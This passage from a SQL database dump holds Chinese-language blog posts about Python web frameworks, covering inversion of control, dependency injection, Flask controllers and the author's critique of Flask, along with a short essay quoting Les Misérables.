的看法中，控制反转是框架和库的关键区别所在。对于一个库而言，用户程序员使用的方式是主动调用它，这是通常情况的做法，也就是“正向”控制；而对于一个框架，往往将用户程序员编写的代码注册到框架中，最后由框架来调用用户程序员编写的代码，这就构成了控制反转。也就是说，控制反转的关键在于“控制者”是谁。对于一个库而言，复用的可能只是算法和数据结构；而对于一个框架而言，复用的往往还有控制流逻辑，这也是控制反转的结果。\n\n\n看 Python Web 框架中的控制反转\n我最喜欢的一个 Python Web 框架是 Flask，从这里我们可以轻易的找出控制反转的应用。比如编写一个 Hello World 演示页面，Flask 的做法是：\nhello.py from flask import Flask\n\n app = Flask(__name__)\n\n @app.route("/")\n def show_helloworld():\n     return "hello, world"\n\n app.run()\n\n在这里，用户程序员编写了产生视图输出的函数 show_helloworld 。当用户不用管 WSGI 是如何控制执行流的，只要将它用 @app.route 装饰器注册到 Flask 的实例 app 中，调用 app.run 之后 Flask 将在每次请求的 URI 命中路由 / 时，调用 show_helloworld 。\n所以，用 Flask 编写 Web 应用的方式是控制反转的应用，Flask 是一个框架而不是一个库。\n而对比 Flask 底层所使用的基础库 Werkzeug，可以很明显的看出区别。同样的 Hello World 演示，原始 WSGI 这样写：\nwsgi.py def application(environ, start_response):\n     start_response(''200 OK'', [(''Content-Type'', ''text/plain'')])\n     return [''Hello World!'']\n\nWerkzeug 则在 HTTP 请求、响应方面提供了更为方便的包装：\nwsgi.py from werkzeug.wrappers import Request, Response\n\n def application(environ, start_response):\n     request = Request(environ)\n     text = ''Hello %s!'' % request.args.get(''name'', ''World'')\n     response = Response(text, mimetype=''text/plain'')\n     return response(environ, start_response)\n\n这种包装和 Flask 最大的不同，是这里并未将控制权交给 Werkzeug，而是仍然把握在 application 函数内，用户程序员调用了 Werkzeug 的组件，但并未委托控制权。如果要实现和上述 Flask 版 Hello World 等价，这里还需要判断 URI 是否为 ''/'' ，如果不是还需要返回 HTTP 404 错误。但如果要实现这些，都需要用户程序员在 application 函数中自己实现。实现过程可能可以调用 Werkzeug 简化细节，但控制权仍然在用户程序员自己手里。所以这里没有应用控制反转，Werkzeug 是一个库而不是一个框架。\n\n\n依赖注入\n依赖注入（Dependency Injection） 则是和控制反转相关的一个话题，最初的目的是解除程序组件之间的一些直接耦合。具体的做法是，将原本的 A 依赖 B，改成 A 依赖一个接口和一个 DI 容器（B 实现了 A 依赖的那个接口），然后将 B 的创建工厂（其中可能使用了创建型设计模式，并将类型转化为 A 所依赖的接口才返回）注册到 DI 容器，最后 A 只需要给 DI 容器一个标识索取 B，DI 容器将回调 B 的创建工厂，生产出 B 的实例之后交给 A。\n如果在动态语言（比如 Python 比如 Ruby）里面这么做，则是一件非常第三类青年的事情。为什么不能直接让 A 去调用 B 的工厂呢？中途插入一个注册表有区别吗？所以我不做第三类青年，在使用 Python 的时候我会选择直接调用工厂，但这在静态语言中行不通。一来静态语言有着静态的变量类型，手动构造带有类型转换的工厂，还不如交托给一个自动构造的容器；二来静态语言的编译期、装载期、运行期是严格分离的，要想运行期做装载的事情，必须运用反射来处理，这个处理语言并没有内置（否则就近似动态语言了），必须编写专门的组件来做，DI 容器就是专门的组件。\n归根结底，依赖注入的本质是运用控制反转。前面说了，要生产对象的工厂是被注册到 DI 容器的（有的 DI 容器可以自动构造常用的工厂），也就是说 DI 容器在对象生产方面就是“框架”，是控制权的主导者。\n\n\n依赖注入在静态语言中的价值\n使用依赖注入，对于静态语言编写的应用来说最大的好处是增加可测试性。前文说了，依赖注入对于静态语言编写的应用一个重要价值是将对象的索取从编译期、装载期移到了运行期。如此一来，即使是已经经过编译的组件，也可以通过更改 DI 容器的配置，将一个被依赖对象替换。\n在做单元测试的时候，用 Stub、Mock 隔离依赖的组件是常用的手法。一般的做法是让 Stub、Mock 对象和真实对象实现相同的接口，以达到“以假乱真”的目的。DI 容器在这个过程中，则负责“替换”这个过程。在生产环境，DI 容器使用生产环境的配置文件，注入到目标对象中的是真实对象；而在测试环境，DI 容器使用测试环境的配置文件，将 Stub 或 Mock 注入到目标对象。\n\n\nDI 容器在动态语言中的不必要\n前文说到，依赖注入对于静态语言构建的项目来说很有价值的一点是增强可测试性。这是由于静态语言本身在编译期、装载期处理依赖。对于动态语言来说，编译期、装载期、运行期是一体的，所以依赖注入在动态语言中可以有着原生的支持，独立的 DI 容器在动态语言构建的项目中没有存在的必要性。\n还是前文说的单元测试 Stub、Mock 的例子，假如在 Python 这样的动态语言中，需要对一个已经编译好的模块使用 Stub、Mock，只需要直接替换其属性。\nimport unittest\nimport urllib2\nimport fakeurllib2\n\ndef install_mock(urllib2):\n    urlllib2.Request = fakeurllib2.Request\n\ndef install_stub(urllib2):\n    urllib2.urlopen = fakeurllib2.urlopen\n\n\ninstall_mock(urllib2)\ninstall_stub(urllib2)\n\n\nclass MyTest(unittest.TestCase):\n\n    # ...\n\n可见，动态语言的运行时环境本身就是一个强大的依赖注入容器。\n', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(88, 'https://blog.tonyseek.com/post/clearer-view-function/', '让 Web 控制器更有条理', '<p>这里的“Web 控制器”指的的确是 MVC 中的 Controller，在 Django 等 Python Web 框架中也被称为“视图”。</p>\n<p>说到本文，源起 Python Web 框架中对于“控制器”有两种不同的表达方法。其中一种是类似于 Rails 的 class-based，另一种是 类似于 Sinatra 的 function-based（当然 Sinatra 的实际是 block-based）。tornado、web.py 采取了前者，而 Flask、Bottle、Django 采取了后者。</p>\n<p>在组织简单代码的时候，两种方式仅仅是风格上的区别，这时候往往 function-based 会显得更加简洁。但对于更加复杂一点的情况，class-based 的控制器有一些代码组织上的优势，可能 function-based 的需要花一些脑筋才能达到相同效果。</p>\n\n<p>举个例子，在 tornado 中如果要实现 Google 的 OpenID 登录，可以将和 OpenID 相关的逻辑分离成一个 GoogleMixin 类，然后混入到控制器中。这样组织出来的代码更加有条理。事实上，tornado 也自带了 GoogleMixin 类， <a class="reference external" href="http://www.tornadoweb.org/documentation/auth.html#google&gt;">官网文档</a> 中有个非常好的使用范例：</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">tornado</span> <span class="kn">import</span> <span class="n">web</span><span class="p">,</span> <span class="n">auth</span>\n\n<span class="k">class</span> <span class="nc">GoogleHandler</span><span class="p">(</span><span class="n">web</span><span class="o">.</span><span class="n">RequestHandler</span><span class="p">,</span> <span class="n">auth</span><span class="o">.</span><span class="n">GoogleMixin</span><span class="p">):</span>\n    <span class="nd">@web.asynchronous</span>\n    <span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_argument</span><span class="p">(</span><span class="s">&quot;openid.mode&quot;</span><span class="p">,</span> <span class="bp">None</span><span class="p">):</span>\n            <span class="n">callback</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">async_callback</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_on_auth</span><span class="p">)</span>\n            <span class="bp">self</span><span class="o">.</span><span class="n">get_authenticated_user</span><span class="p">(</span><span class="n">callback</span><span class="p">)</span>\n            <span class="k">return</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">authenticate_redirect</span><span class="p">()</span>\n\n    <span class="k">def</span> <span class="nf">_on_auth</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user</span><span class="p">):</span>\n        <span class="k">if</span> <span class="ow">not</span> <span class="n">user</span><span class="p">:</span>\n            <span class="k">raise</span> <span class="n">web</span><span class="o">.</span><span class="n">HTTPError</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="s">&quot;Google auth failed&quot;</span><span class="p">)</span>\n        <span class="c"># Save the user with, e.g., set_secure_cookie()</span>\n</pre></div>\n</figure><p>从范例可以看到，这种 class-based 的控制器不仅能将某一个主关注点的代码分离，还能将细节步骤以类成员函数的形式写出来，代码条理性非常好。但是如果是 function-based 的控制器呢？恐怕就不像写 <tt class="docutils literal">hello, world</tt> 的时候那么舒服了。</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Blueprint</span>\n\n<span class="n">app</span> <span class="o">=</span> <span class="n">Blueprint</span><span class="p">(</span><span class="s">&quot;app&quot;</span><span class="p">,</span> <span class="n">__name__</span><span class="p">)</span>\n\n<span class="nd">@app.route</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">)</span>\n<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>\n    <span class="c"># 这里还很舒服</span>\n    <span class="k">return</span> <span class="s">&quot;hello, world&quot;</span>\n\n<span class="nd">@app.route</span><span class="p">(</span><span class="s">&quot;/oauth2/google&quot;</span><span class="p">)</span>\n<span class="k">def</span> <span class="nf">oauth2_google</span><span class="p">():</span>\n    <span class="c"># 这里应该怎么组织呢？</span>\n    <span class="k">return</span> <span class="s">&quot;= =!&quot;</span>\n</pre></div>\n</figure><p>分析一下造成这种差异主要的主要原因：</p>\n<ul class="simple">\n<li>类可以以继承的方式复用代码，函数不行</li>\n<li>类可以包含多个成员函数组织代码，函数只能借助全局作用域的其他函数</li>\n</ul>\n<p>所以，现在要做的是提出对策：</p>\n<ul class="simple">\n<li>函数可以以装饰器的形式复用代码</li>\n<li>装饰器可以写成类的形式，以求分离成员函数，提高代码条理性</li>\n</ul>\n<p>用伪代码表达这两个对策就是：</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">import</span> <span class="nn">functools</span>\n\n<span class="k">class</span> <span class="nc">ComplexFlow</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n    <span class="sd">&quot;&quot;&quot;Decorator Class.&quot;&quot;&quot;</span>\n\n    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">view_function</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">view_function</span> <span class="o">=</span> <span class="n">view_function</span>\n        <span class="n">functools</span><span class="o">.</span><span class="n">update_wrapper</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">view_function</span><span class="p">)</span>\n\n    <span class="k">def</span> <span class="nf">prepare</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n        <span class="k">pass</span>  <span class="c"># complex process</span>\n\n    <span class="k">def</span> <span class="nf">on_unauthenticated</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n        <span class="k">pass</span>  <span class="c"># complex process</span>\n\n    <span class="k">def</span> <span class="nf">result_handle</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">raw_result</span><span class="p">):</span>\n        <span class="k">return</span> <span class="n">raw_result</span>  <span class="c"># complex process</span>\n\n    <span class="k">def</span> <span class="nf">__call__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">prepare</span><span class="p">()</span>\n        <span class="k">try</span><span class="p">:</span>\n            <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">view_function</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>\n            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">result_handle</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>\n        <span class="k">except</span> <span class="n">Unauthenticated</span><span class="p">:</span>\n            <span class="bp">self</span><span class="o">.</span><span class="n">on_authenticated</span><span class="p">()</span>\n            <span class="k">return</span> <span class="n">abort</span><span class="p">(</span><span class="mi">401</span><span class="p">)</span>\n\n<span class="n">complex_flow</span> <span class="o">=</span> <span class="n">ComplexFlow</span>\n\n\n<span class="c"># -----</span>\n<span class="c"># Usage</span>\n<span class="c"># -----</span>\n\n<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Blueprint</span>\n\n<span class="n">app</span> <span class="o">=</span> <span class="n">Blueprint</span><span class="p">(</span><span class="s">&quot;app&quot;</span><span class="p">,</span> <span class="n">__name__</span><span class="p">)</span>\n\n<span class="nd">@app.route</span><span class="p">(</span><span class="s">&quot;/mywork&quot;</span><span class="p">)</span>\n<span class="nd">@complex_flow</span>\n<span class="k">def</span> <span class="nf">mywork</span><span class="p">():</span>\n    <span class="k">return</span> <span class="s">&quot;= =!&quot;</span>\n</pre></div>\n</figure><p>这么一来代码就更加有清晰了，实现了“复用”和“分离”两个目标。如果结合比 Class Request Context 更灵活的 LocalThread Context，完全可以将复杂的 function-based Web 控制器组织得比 class-based 的更有条理。</p>', '2014-11-06 23:43:08', 6, '2012-03-27 04:51:00', '2012-03-27 04:51:00', 0, '[["self", 0.5147986006033493], ["based", 0.2859992225574163], ["function", 0.2859992225574163], ["def", 0.2859992225574163], ["__", 0.228799378045933], ["return", 0.20019945579019138], ["app", 0.20019945579019138], ["\\u4ee3\\u7801", 0.18880116446368422], ["result", 0.17159953353444976], ["class", 0.17159953353444976], ["\\u63a7\\u5236\\u5668", 0.16188037806617223], ["web", 0.14299961127870814], ["auth", 0.14299961127870814], ["view", 0.14299961127870814], ["complex", 0.14299961127870814], ["\\u51fd\\u6570", 0.11863060382693781], ["Web", 0.1143996890229665], ["tornado", 0.1143996890229665], ["import", 0.1143996890229665], ["Blueprint", 0.1143996890229665]]', NULL, NULL, '这里的“Web 控制器”指的的确是 MVC 中的 Controller，在 Django 等 Python Web 框架中也被称为“视图”。\n说到本文，源起 Python Web 框架中对于“控制器”有两种不同的表达方法。其中一种是类似于 Rails 的 class-based，另一种是 类似于 Sinatra 的 function-based（当然 Sinatra 的实际是 block-based）。tornado、web.py 采取了前者，而 Flask、Bottle、Django 采取了后者。\n在组织简单代码的时候，两种方式仅仅是风格上的区别，这时候往往 function-based 会显得更加简洁。但对于更加复杂一点的情况，class-based 的控制器有一些代码组织上的优势，可能 function-based 的需要花一些脑筋才能达到相同效果。\n\n举个例子，在 tornado 中如果要实现 Google 的 OpenID 登录，可以将和 OpenID 相关的逻辑分离成一个 GoogleMixin 类，然后混入到控制器中。这样组织出来的代码更加有条理。事实上，tornado 也自带了 GoogleMixin 类， 官网文档 中有个非常好的使用范例：\nfrom tornado import web, auth\n\nclass GoogleHandler(web.RequestHandler, auth.GoogleMixin):\n    @web.asynchronous\n    def get(self):\n        if self.get_argument("openid.mode", None):\n            callback = self.async_callback(self._on_auth)\n            self.get_authenticated_user(callback)\n            return\n        self.authenticate_redirect()\n\n    def _on_auth(self, user):\n        if not user:\n            raise web.HTTPError(500, "Google auth failed")\n        # Save the user with, e.g., set_secure_cookie()\n\n从范例可以看到，这种 class-based 的控制器不仅能将某一个主关注点的代码分离，还能将细节步骤以类成员函数的形式写出来，代码条理性非常好。但是如果是 function-based 的控制器呢？恐怕就不像写 hello, world 的时候那么舒服了。\nfrom flask import Blueprint\n\napp = Blueprint("app", __name__)\n\n@app.route("/")\ndef home():\n    # 这里还很舒服\n    return "hello, world"\n\n@app.route("/oauth2/google")\ndef oauth2_google():\n    # 这里应该怎么组织呢？\n    return "= =!"\n\n分析一下造成这种差异主要的主要原因：\n\n类可以以继承的方式复用代码，函数不行\n类可以包含多个成员函数组织代码，函数只能借助全局作用域的其他函数\n\n所以，现在要做的是提出对策：\n\n函数可以以装饰器的形式复用代码\n装饰器可以写成类的形式，以求分离成员函数，提高代码条理性\n\n用伪代码表达这两个对策就是：\nimport functools\n\nclass ComplexFlow(object):\n    """Decorator Class."""\n\n    def __init__(self, view_function):\n        self.view_function = view_function\n        functools.update_wrapper(self, view_function)\n\n    def prepare(self):\n        pass  # complex process\n\n    def on_unauthenticated(self):\n        pass  # complex process\n\n    def result_handle(self, raw_result):\n        return raw_result  # complex process\n\n    def __call__(self, *args, **kwargs):\n        self.prepare()\n        try:\n            result = self.view_function(*args, **kwargs)\n            return self.result_handle(result)\n        except Unauthenticated:\n            self.on_authenticated()\n            return abort(401)\n\ncomplex_flow = ComplexFlow\n\n\n# -----\n# Usage\n# -----\n\nfrom flask import Blueprint\n\napp = Blueprint("app", __name__)\n\n@app.route("/mywork")\n@complex_flow\ndef mywork():\n    return "= =!"\n\n这么一来代码就更加有清晰了，实现了“复用”和“分离”两个目标。如果结合比 Class Request Context 更灵活的 LocalThread Context，完全可以将复杂的 function-based Web 控制器组织得比 class-based 的更有条理。', NULL, NULL, NULL),
(89, 'https://blog.tonyseek.com/post/we-are-the-same/', '所有的战争都是内战', '<p><a class="reference external" href="http://wolf1990.tumblr.com/post/19661960724">&#64;wolf1990: 为什么要分的那么清楚呢？</a></p>\n<blockquote>\n<p>为什么要分的那么清楚呢？丰顺三汤片本来就是客家地区和潮汕地区的交接处，是客家是潮汕又怎样，我们是客家人，喜欢潮汕文化……不行么？本来我们就是一群认同潮汕风俗的客家人，有什么好讨论的……</p>\n<p>构思文章中……</p>\n</blockquote>\n<p>让我想起了《悲惨世界》中的对话，花匠准备参加巷战，请求修道院的院长嬷嬷祈福。</p>\n<p>院长嬷嬷：我会为你感到遗憾的，也就是说，没有人能强迫你参加这场战争，一场内战。</p>\n<p>花匠：所有的战争都是内战，因为所有的人都是兄弟。</p>', '2014-11-06 23:43:08', 6, '2012-03-22 04:15:00', '2012-03-22 04:15:00', 0, '[["\\u6f6e\\u6c55", 0.424000477146], ["\\u8981\\u5206", 0.34156478579714283], ["\\u82b1\\u5320", 0.33774960315142855], ["\\u5ba2\\u5bb6\\u4eba", 0.3101758632657143], ["\\u5ba2\\u5bb6", 0.28904251480285714], ["\\u5b37\\u5b37", 0.2884004332057143], ["\\u5185\\u6218", 0.2144404586817143], ["\\u9662\\u957f", 0.1859965465782857], ["\\u4e09\\u6c64\\u7247", 0.17078239289857142], ["\\u4eba\\u80fd", 0.17078239289857142], ["wolf1990", 0.17078239289857142], ["\\u4e30\\u987a", 0.16719218678], ["\\u6f6e\\u6c55\\u5730\\u533a", 0.16719218678], ["\\u672c\\u6765", 0.164086303908], ["\\u6e05\\u695a", 0.16141530036828572], ["\\u60b2\\u60e8\\u4e16\\u754c", 0.16088029032], ["\\u611f\\u5230\\u9057\\u61be", 0.15378833479999998], ["\\u6218\\u4e89", 0.15369409302685716], ["\\u4e3a\\u4ec0\\u4e48", 0.15104916548942857], ["\\u4ea4\\u63a5\\u5904", 0.14999257528999999]]', NULL, NULL, '@wolf1990: 为什么要分的那么清楚呢？\n\n为什么要分的那么清楚呢？丰顺三汤片本来就是客家地区和潮汕地区的交接处，是客家是潮汕又怎样，我们是客家人，喜欢潮汕文化……不行么？本来我们就是一群认同潮汕风俗的客家人，有什么好讨论的……\n构思文章中……\n\n让我想起了《悲惨世界》中的对话，花匠准备参加巷战，请求修道院的院长嬷嬷祈福。\n院长嬷嬷：我会为你感到遗憾的，也就是说，没有人能强迫你参加这场战争，一场内战。\n花匠：所有的战争都是内战，因为所有的人都是兄弟。', NULL, NULL, NULL),
(90, 'https://blog.tonyseek.com/post/discuss-about-flask-framework/', '吐槽 Python Web 框架 Flask', '<p>Python 多到数不过来的 Web 框架已经成为了一大风景，而且不同于 PHP Frameworks 集体山寨 Rails 的风格，几乎每个 Python 框架都有自己的特色。我接触过的有 web.py、Django、Bottle、Flask ，其中属 Flask 最为我喜欢。有时候框架会被称为“轮子”，但是可以确定的一点是这四个框架一定不是轮子，我最喜欢的 Flask 有许多非常方便的特性，当然也有我想吐槽的不爽点。于是写一篇博客把吐槽记录下来。</p>\n\n<div class="section" id="id1">\n<h2>闪亮亮的点</h2>\n<div class="section" id="id2">\n<h3>松耦合的组件</h3>\n<p>这点是 Flask 和 Django 最不同的地方，冲着这点甚至都不应该把 Flask 叫“框架”（Framework），应该叫“库”（Library）。在使用 Flask 的时候，如果控制得合适，可以让 Flask 只和 Web 层面耦合，其他方面不仅可以不受 Flask 影响，还能任意使用 PyPI 上数量庞大的第三方库。</p>\n</div>\n<div class="section" id="thread-local">\n<h3>灵活的 Thread Local 模式</h3>\n<p>很多 Web 框架（比如 web.py、tornado）用类的方式来做 Web 表现层的控制器，请求上下文资源以类成员的形式提供。这样虽然看起来很“面向对象”，却不利于良好地组织代码结构。Web 层除了表现层还会有许多其他自己编写的工具，比如负责用户登录、注销的服务组件，这些组件多多少少都要操纵 Web 上下文。类控制器需要通过传递上下文对象来达到这一目的，这种传递方式会给开发造成不必要的麻烦，到哪里都要给 Context 留个座位。</p>\n<p>很庆幸 Flask 没有采取这种方式，而是使用了 ThreadLocal 模式。这有点类似于 PHP 的原理，每个请求线程内部拥有独立的变量空间，用来保存上下文，请求内可以非常安全地操作这些上下文。</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">request</span>\n\n<span class="nd">@app.route</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">)</span>\n<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>\n    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">''username''</span><span class="p">)</span>\n    <span class="k">return</span> <span class="s">&quot;hello, </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">username</span>\n</pre></div>\n</figure></div>\n<div class="section" id="id3">\n<h3>反向路由</h3>\n<p>反向路由又是 Flask 的一亮点功能，很多框架（比如 Bottle）虽然提供了类似功能，却设计的比较鸡肋。有了这个功能，基本可以告别硬编码 URL 了。</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">render_template</span>\n\n<span class="nd">@app.route</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">)</span>\n<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>\n    <span class="n">login_uri</span> <span class="o">=</span> <span class="n">url_for</span><span class="p">(</span><span class="s">&quot;login&quot;</span><span class="p">,</span> <span class="nb">next</span><span class="o">=</span><span class="n">url_for</span><span class="p">(</span><span class="s">&quot;home&quot;</span><span class="p">))</span>\n    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">&quot;home.html&quot;</span><span class="p">,</span> <span class="o">**</span><span class="nb">locals</span><span class="p">())</span>\n</pre></div>\n</figure></div>\n<div class="section" id="blueprint">\n<h3>蓝图（Blueprint）</h3>\n<p>Blueprint 类似于 Django 的 App 概念，是 Web 应用中的“子模块”。不同于 Django App 或者 web.py subapplication 的是，Flask 的 Blueprint 同时支持整合静态资源。这一点是通过配合使用 <tt class="docutils literal">url_for</tt> 反向路由做到的。例如应用中有一个 <tt class="docutils literal">admin</tt> Blueprint，其静态资源的 URI 可以通过 <tt class="docutils literal"><span class="pre">url_for(&quot;admin.static&quot;,</span> &quot;/scripts/admin.js&quot;)</tt> 获取，这样就不用分离了模块代码却将静态资源放在一起了。</p>\n<p>每一个 Blueprint 对象，对于模块内来说，就像是一个独立的 Flask Application，拆卸、复用都非常方便。</p>\n</div>\n</div>\n<div class="section" id="id4">\n<h2>想吐槽的不爽点</h2>\n<div class="section" id="id5">\n<h3>模板引擎</h3>\n<p>前文说了 Flask 有着松耦合的组件，但有一个例外，就是模板引擎。我实在理解不了为何 Flask 要把模板绑死在 Jinja 2 上。Flask 文档中的说法是因为使用了 Jinja 2 独有的高级特性，例如过滤器，可问题是这些高级特性确确实实不是 Jinja 2 独有的，Mako 一样有。做一个适配器应该不是难事，可是 Flask 却选择只绑定自家的 Jinja 2。</p>\n<p>Jinja 2 的确是很优秀的模板引擎，可是强制使用 Jinja 2 就让开发者做选择的权利被剥夺了。Mako 等模板是另一种风格，支持直接在模板中写 Python 代码，在不少地方更加灵活，完全有理由给开发者选择的机会。支持 Mako 的第三方 Flask 插件也是存在的，可是因为不是直接嵌入 Flask Application，和其他 Flask 插件的兼容很是问题。</p>\n</div>\n<div class="section" id="cookie">\n<h3>Cookie</h3>\n<p>另一个搞不懂的是，为何 Flask 对于 Cookie 的支持是原始接口。在 Flask 中使用 Session，只需要像操作普通 dict 一样操作 ThreadLocal 的 session 对象，Flask 最终会将其写入响应头；可是写入一个 Cookie 居然需要自己构造 Response 对象，然后调用 set_cookie 方法。我觉得这是一个非常奇怪的设计，为 Session 提供高级接口却不为 Cookie 提供。要知道，不是什么时候都需要用 Session 这样服务器端会话存储的，有时候为了保存一些用户选项（例如区域、语言），操作 Cookie 却如此麻烦。</p>\n</div>\n</div>', '2014-11-06 23:43:08', 6, '2012-03-22 03:29:00', '2012-03-22 03:29:00', 0, '[["Flask", 0.506753150411946], ["Web", 0.16123963876743738], ["Jinja", 0.13820540465780345], ["\\u6a21\\u677f", 0.12138127480115607], ["Blueprint", 0.11517117054816955], ["Cookie", 0.11517117054816955], ["url", 0.11517117054816955], ["\\u4e0a\\u4e0b\\u6587", 0.09913063332658961], ["\\u6846\\u67b6", 0.09768529141188824], ["Django", 0.09213693643853564], ["home", 0.09213693643853564], ["\\u7ec4\\u4ef6", 0.07228430886265895], ["web", 0.06910270232890173], ["admin", 0.06910270232890173], ["Session", 0.06910270232890173], ["Mako", 0.06910270232890173], ["py", 0.06910270232890173], ["username", 0.06910270232890173], ["Python", 0.06910270232890173], ["\\u8def\\u7531", 0.062226493849710976]]', NULL, NULL, 'Python 多到数不过来的 Web 框架已经成为了一大风景，而且不同于 PHP Frameworks 集体山寨 Rails 的风格，几乎每个 Python 框架都有自己的特色。我接触过的有 web.py、Django、Bottle、Flask ，其中属 Flask 最为我喜欢。有时候框架会被称为“轮子”，但是可以确定的一点是这四个框架一定不是轮子，我最喜欢的 Flask 有许多非常方便的特性，当然也有我想吐槽的不爽点。于是写一篇博客把吐槽记录下来。\n\n\n闪亮亮的点\n\n松耦合的组件\n这点是 Flask 和 Django 最不同的地方，冲着这点甚至都不应该把 Flask 叫“框架”（Framework），应该叫“库”（Library）。在使用 Flask 的时候，如果控制得合适，可以让 Flask 只和 Web 层面耦合，其他方面不仅可以不受 Flask 影响，还能任意使用 PyPI 上数量庞大的第三方库。\n\n\n灵活的 Thread Local 模式\n很多 Web 框架（比如 web.py、tornado）用类的方式来做 Web 表现层的控制器，请求上下文资源以类成员的形式提供。这样虽然看起来很“面向对象”，却不利于良好地组织代码结构。Web 层除了表现层还会有许多其他自己编写的工具，比如负责用户登录、注销的服务组件，这些组件多多少少都要操纵 Web 上下文。类控制器需要通过传递上下文对象来达到这一目的，这种传递方式会给开发造成不必要的麻烦，到哪里都要给 Context 留个座位。\n很庆幸 Flask 没有采取这种方式，而是使用了 ThreadLocal 模式。这有点类似于 PHP 的原理，每个请求线程内部拥有独立的变量空间，用来保存上下文，请求内可以非常安全地操作这些上下文。\nfrom flask import request\n\n@app.route("/")\ndef home():\n    username = request.cookies.get(''username'')\n    return "hello, %s" % username\n\n\n\n反向路由\n反向路由又是 Flask 的一亮点功能，很多框架（比如 Bottle）虽然提供了类似功能，却设计的比较鸡肋。有了这个功能，基本可以告别硬编码 URL 了。\nfrom flask import url_for, render_template\n\n@app.route("/")\ndef home():\n    login_uri = url_for("login", next=url_for("home"))\n    return render_template("home.html", **locals())\n\n\n\n蓝图（Blueprint）\nBlueprint 类似于 Django 的 App 概念，是 Web 应用中的“子模块”。不同于 Django App 或者 web.py subapplication 的是，Flask 的 Blueprint 同时支持整合静态资源。这一点是通过配合使用 url_for 反向路由做到的。例如应用中有一个 admin Blueprint，其静态资源的 URI 可以通过 url_for("admin.static", "/scripts/admin.js") 获取，这样就不用分离了模块代码却将静态资源放在一起了。\n每一个 Blueprint 对象，对于模块内来说，就像是一个独立的 Flask Application，拆卸、复用都非常方便。\n\n\n\n想吐槽的不爽点\n\n模板引擎\n前文说了 Flask 有着松耦合的组件，但有一个例外，就是模板引擎。我实在理解不了为何 Flask 要把模板绑死在 Jinja 2 上。Flask 文档中的说法是因为使用了 Jinja 2 独有的高级特性，例如过滤器，可问题是这些高级特性确确实实不是 Jinja 2 独有的，Mako 一样有。做一个适配器应该不是难事，可是 Flask 却选择只绑定自家的 Jinja 2。\nJinja 2 的确是很优秀的模板引擎，可是强制使用 Jinja 2 就让开发者做选择的权利被剥夺了。Mako 等模板是另一种风格，支持直接在模板中写 Python 代码，在不少地方更加灵活，完全有理由给开发者选择的机会。支持 Mako 的第三方 Flask 插件也是存在的，可是因为不是直接嵌入 Flask Application，和其他 Flask 插件的兼容很是问题。\n\n\nCookie\n另一个搞不懂的是，为何 Flask 对于 Cookie 的支持是原始接口。在 Flask 中使用 Session，只需要像操作普通 dict 一样操作 ThreadLocal 的 session 对象，Flask 最终会将其写入响应头；可是写入一个 Cookie 居然需要自己构造 Response 对象，然后调用 set_cookie 方法。我觉得这是一个非常奇怪的设计，为 Session 提供高级接口却不为 Cookie 提供。要知道，不是什么时候都需要用 Session 这样服务器端会话存储的，有时候为了保存一些用户选项（例如区域、语言），操作 Cookie 却如此麻烦。\n\n', NULL, NULL, NULL),
